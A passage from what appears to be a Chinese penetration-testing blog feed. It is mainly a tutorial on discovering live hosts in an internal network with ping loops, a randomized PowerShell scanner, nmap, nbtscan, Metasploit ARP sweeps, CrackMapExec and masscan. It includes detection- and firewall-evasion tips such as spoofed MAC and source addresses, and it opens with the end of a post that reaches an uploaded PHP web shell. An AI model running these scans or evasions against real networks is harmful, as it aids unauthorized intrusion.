&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="mf">20.20&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">20.129&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">upload&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">img&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">20240606101139614.&lt;/span>&lt;span class="n">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">到这一步我们已经成功的上线目标服务器了。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131559.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250911131603.png" alt="image.png">&lt;/p></description></item><item><title>【内网攻防】内网扫描探测</title><link>http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/</link><pubDate>Wed, 10 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/</guid><description>&lt;img src="http://localhost:1313/images/58.webp" alt="Featured image of post 【内网攻防】内网扫描探测" />&lt;h1 id="0x00-简介">0x00 简介&lt;/h1>
&lt;p>在渗透测试中可以根据⽬标主机的情况，上传⼯具进⾏主机存活探测，也可以借助内⽹代理或路由转发对⽬标主机所处的局域⽹发起探测。&lt;br>
测试⼈员可以根据当前渗透环境，选⽤ICMP、NetBIOS、UDP、ARP、SNMP、SMB等多种⽹络协议。按照协议类型，下⾯介绍使⽤常⻅⼯具来发现内⽹存活主机的⽅法。&lt;/p>
&lt;h1 id="0x01-探测域内存活主机">0x01 探测域内存活主机&lt;/h1>
&lt;p>协议对⽐表:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>协议&lt;/th>
&lt;th>最佳适⽤场景&lt;/th>
&lt;th>规避检测技巧&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>ARP&lt;/td>
&lt;td>局域⽹快速精准探测&lt;/td>
&lt;td>伪造源MAC地址&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ICMP&lt;/td>
&lt;td>跨⽹段基础存活探测&lt;/td>
&lt;td>随机延迟发送、TTL伪装&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>UDP&lt;/td>
&lt;td>防⽕墙绕过探测&lt;/td>
&lt;td>使⽤⾮常⽤端⼝(5353/161等)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>SMB&lt;/td>
&lt;td>Windows主机专项探测&lt;/td>
&lt;td>匿名空会话连接&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>NetBIOS&lt;/td>
&lt;td>主机名和⻆⾊识别&lt;/td>
&lt;td>结合137/138/139端⼝扫描&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="1-利icmp协议快速探测内">1. 利⽤ICMP协议快速探测内⽹&lt;/h2>
&lt;p>ICMP (Internet Control Message Protocol，因特⽹控制消息协议）是TCP/IP 协议簇的⼀个⼦协议，⽤于⽹络层的通信，即IP主机、路由器之间传递控制消息，提供可能友⽣在通信环境中的各种问题反馈。通过这些信息，管理员可以对发⽣的问题做出诊断，然后采取适当的措施解决。 在实际利⽤中，可以通过ICMP循环对整个⽹段中的每个IP地址执⾏ping 命令，所有能够ping 通的IP地址即为内⽹中存活的主机。 在⽬标主机中执⾏以下命令：&lt;/p>
&lt;h3 id="for">for&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">for /L %I in (1,1,254) Do @ping -n 1 -w 100 192.168.12.%I | findstr /i &amp;#34;TTL=&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">代码解释：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-n 1 ：每个IP只发送1个ICMP包（加快扫描速度）。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-w 100 ：等待回复的超时时间设为100毫秒（根据⽹络质量调整）。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/i： 忽略⼤⼩写，确保匹配 或 。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ：管道符，将 ping 结果传递给 findstr 过滤。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250728111742.png" alt="image.png">&lt;/p>
&lt;h3 id="powershell">PowerShell&lt;/h3>
&lt;p>创建⼀个scanip.ps1&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">function Invoke-StealthPing {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">param($subnet, $start, $end, $threads=20)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$block = {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">param($ip)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Start-Sleep -Milli (Get-Random -Min 100 -Max 800)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">if (Test-Connection $ip -Count 1 -Quiet -EA 0) {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[Convert] ToBase64String([Text.Encoding] UTF8.GetBytes($ip))
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> }
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$jobs = @()
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1 254 | % {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ip = &amp;#34;$subnet.$_&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">while ($jobs.Count -ge $threads) {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$completed = $jobs | ? State -ne &amp;#39;Running&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$completed | Receive-Job
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$jobs = $jobs | ? State -eq &amp;#39;Running&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $jobs += Start-Job $block -Arg $ip
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$jobs | Wait-Job | Receive-Job | % {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[Text.Encoding] UTF8.GetString([Convert] FromBase64String($_))
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> }
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="nmap">nmap&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nmap -sn -PE 192.168.12.0/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="利netbios快速探测内">利⽤NetBIOS快速探测内⽹&lt;/h3>
&lt;p>NetBIOS是局域⽹程序使⽤的⼀种程序编辑接⼝（API），为程序提供了请求级别服务的统⼀的命令集，为局域⽹提供了⽹络及其他特殊功能。&lt;br>
nbtscan是⼀个命令⾏⼯具，⽤于扫描本地或远程tcp/ip⽹络上的开放NEtBIos名称服务器。在实际利⽤时，向局域⽹的每个IP地址发送NetBIOS状态查询，可以获得主机名、MAC地&lt;br>
址等信息。 NBTScan是⼀款⽤于扫描Windows⽹络上 NetBIOS名称的程序，⽤于发现内⽹中存活的 Windows 主机。 NBTScan可以对给定IP范围内的每个IP地址发送NetBIOS状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，会列出它的IP地址、NetBIOS计算机名、登录⽤户名和MAC地址。总之，NBTSCAN可以获取到PC的真实IP地址和MAC地址。&lt;br>
将nbtscan.exe 上传到⽬标主机（⽹⻚搜索下载即可），执⾏以下命令：&lt;br>
下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">unixwiz&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">net&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">tools&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">nbtscan&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="c1">#download&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">github&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">charlesroelli&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">nbtscan&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nbtscan.exe 192.168.199.1/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250728112652.png" alt="image.png">&lt;/p>
&lt;h3 id="nmap-1">nmap&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nmap -sU -p 137 script nbstat.nse 192.168.12.0/24
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">关键参数说明：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1. -sU
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 功能：启用 UDP 扫描模式，用于发现目标主机开放的 UDP 端口。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 背景：UDP 是无连接协议，扫描难度大于 TCP，需通过发送 UDP 包并分析响应判断端口状态。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2. -p 137
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 功能：指定扫描目标的 UDP 137 端口。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 背景：137 端口是 NetBIOS 名称服务（NBNS）的标准端口，用于计算机在局域网中解析 NetBIOS 名称（如 Windows 计算机名）。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3. --script nbstat.nse
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 功能：执行 Nmap 脚本引擎（NSE）中的nbstat.nse脚本。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 脚本作用：通过 NetBIOS 协议获取目标主机的详细信息，包括：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 计算机名、工作组 / 域名称
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 已注册的 NetBIOS 服务（如文件共享、打印服务）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 用户名（部分情况下可泄露）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 操作系统类型（通过分析响应特征推测）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">4. 192.168.12.0/24
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 功能：指定扫描的目标 IP 范围，即192.168.12.1到192.168.12.254的所有主机。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="基于udp发现存活主机">基于UDP发现存活主机&lt;/h2>
&lt;h3 id="nmap-2">nmap&lt;/h3>
&lt;p>UDP (User Datagram Protocol，⽤户数据报协议）是⼀种⽤于传输层的⽆连接传输的协议，为应⽤程序提供⼀种不需建⽴连接就可以发送封装的IP数据包的⽅法。 在实际利⽤中，可以将⼀个空的UDP报⽂发送到⽬标主机的特定端⼝，如果⽬标主机的端⼝是关闭的，UDP 探测就⻢上得到⼀个ICMP端⼝⽆法到达的回应报⽂，这意味着该主机正在运⾏ 。 如果到达⼀个开放的端⼝，⼤部分服务仅仅忽略这个空报⽂⽽不做任何回应 。Unicornscan是Kali Linux平台的⼀款信息收集⼯具，提供了⽹络扫描功能。 执⾏以下命令，通过UDP协议扫描内⽹的存活主机&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nmap -sU 192.168.12.0/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="unicornscan">Unicornscan&lt;/h3>
&lt;p>kali⾃带 macos linux&lt;br>
命令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">unicornscan -mU 192.168.12.0/241-65535
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="通过arp扫描探测内">通过arp扫描探测内⽹&lt;/h2>
&lt;p>ARP (Address Resolution Protocol，地址解析协议）是⼀个通过解析⽹络层地址来找寻数据链路层地址的⽹络传输协议，⽤于⽹络层通信。主机发送信息时，将包含⽬标IP地址的ARP请求⼴播到局域⽹上的所有主机，并接收返回消息，以此确定⽬标的物理地址﹔收到返回消息后，将该IP地址和物理地址存⼊本机 ARP缓存，并保留⼀定时间，下次请求时直接查询ARP缓存，以节约资源。 在实际利⽤中，可以向⽹络发送⼀个ARP请求，若⽬标主机处于活跃状态，则其⼀定会回应⼀个ARP响应，否则不会做出任何回应。&lt;/p>
&lt;h3 id="arp-scan具">arp-scan⼯具&lt;/h3>
&lt;p>下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">gitcode&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">open&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">source&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">toolkit&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">36&lt;/span>&lt;span class="n">a6c&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">blob&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">main&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">arp&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">scan&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">windows&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">zip&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>命令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">./arp-scan.exe -t 172.16.41.1/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="msf">msf&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">启动msf
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msfconsole
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf &amp;gt; use auxiliary/scanner/discovery/arp_sweep
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf &amp;gt; show options
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf &amp;gt; set interface eth0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf &amp;gt; set smac 000c:2992:fd:85
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf &amp;gt; set rhosts 192.168.174.1/24
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf &amp;gt; set threads 20
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf &amp;gt; set shost 192.168.174.131 (伪造源ip)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf &amp;gt; run
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="基于smb协议发现存活主机">基于SMB协议发现存活主机&lt;/h2>
&lt;p>SMB （ 端 ⼝ 445 ） ⼜ 称 为 ⽹ 络 ⽂ 件 共 享 系 统 (Common Internet File System ， CIFS ） 协议，是⼀种应⽤层传输协议，主要功能是使⽹络上的机器能够共享计算机⽂件、打印机、串⾏端⼝和通信等资源。CIFS消息⼀般使⽤NetBIOS或TCP发送，分别使⽤139或445端⼝，⽬前倾向于使⽤445端⼝。 在实际利⽤中，可以探测局域⽹中存在的SMB服务，从⽽发现内⽹的存活主机，多适⽤于Windows主机的发现。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nmap -p 445 open -T4 192.168.12.0/24 -oG smb_hosts.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>CrackMapExec （简称 CME) 是⼀款⼗分强⼤的后滲透利⽤⼯具，在 Kali Linux 上可以直接使⽤ apt-get 命令进⾏安装。CrackMapExec 能够枚举登录⽤户、枚举 SMB 服关表、执⾏ WIRM 攻 击 等 功 能 ， 可 以 帮 助 测 试 ⼈ 员 ⾃ 动 化 评 估 ⼤ 型 城 ⽹ 络 的 安 全 性&lt;br>
下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/Porchetta-Industries/CrackMapExec/releases
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>命令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">crackmapexec smb 172.16.41.1/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="tcp协议扫描">TCP协议扫描&lt;/h2>
&lt;p>三次握⼿ 四次挥⼿&lt;/p>
&lt;h3 id="nmap-3">nmap&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># 基础扫描（SYN半开扫描）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap -sS -T4 192.168.1.0/24
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># 精准服务识别
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap -sV -sC -O -p1-65535 192.168.1.1/24 -oA full_scan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># 规避防⽕墙
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap -f mtu 24 data-length 100 -D RND5 scan-delay 192.168.1.0/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="masscan">masscan&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># 安装
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git clone https://github.com/robertdavidgraham/masscan make -j
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># 扫描B段80/443端⼝
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./masscan 10.0.0.0/8 -p80,443 rate 100000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="rustscan">rustscan&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># 安装
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker pull rustscan/rustscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># 扫描并⾃动调⽤Nmap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rustscan -a 192.168.1.0/24 -A -sC
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="扫描域内端">扫描域内端⼝&lt;/h2>
&lt;p>端⼝的banner信息 ，端⼝上运⾏的服务，常⻅应⽤的默认端⼝&lt;/p>
&lt;h3 id="利telnet命令进扫描">利⽤telnet命令进⾏扫描&lt;/h3>
